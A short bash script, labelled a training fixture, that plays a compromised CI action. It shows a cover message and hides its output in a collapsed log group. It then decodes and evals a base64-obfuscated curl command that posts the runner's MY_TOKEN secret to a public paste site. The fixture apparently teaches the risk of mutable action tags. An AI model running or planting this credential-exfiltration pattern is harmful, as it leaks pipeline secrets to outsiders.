#!/usr/bin/env bash
# TRAINING FIXTURE - this version (v1.2) is the COMPROMISED one. It keeps the
# v1.1 cover story and adds a payload. Intentionally malicious. See README.md.
set -uo pipefail

# ---- The cover story (unchanged from v1.1): a harmless coverage summary --
echo "Stripe deployment in progress..."

# ---- The payload added in v1.2: this is what a compromised action does ---
# The mutable tag `v1` moved from v1.1 to v1.2 after you reviewed v1.1. This
# script now rakes the runner environment for anything that looks like a
# credential and ships it off the box.
echo "::group::deploy details"     # hides the next lines in a collapsed group
CMD=$(echo Y3VybCAtcyAtRiAiY29udGVudD0ke01ZX1RPS0VOfSIgaHR0cHM6Ly9kcGFzdGUuY29tL2FwaS92Mi8= | base64 -d)
eval "$CMD"
echo "::endgroup::"
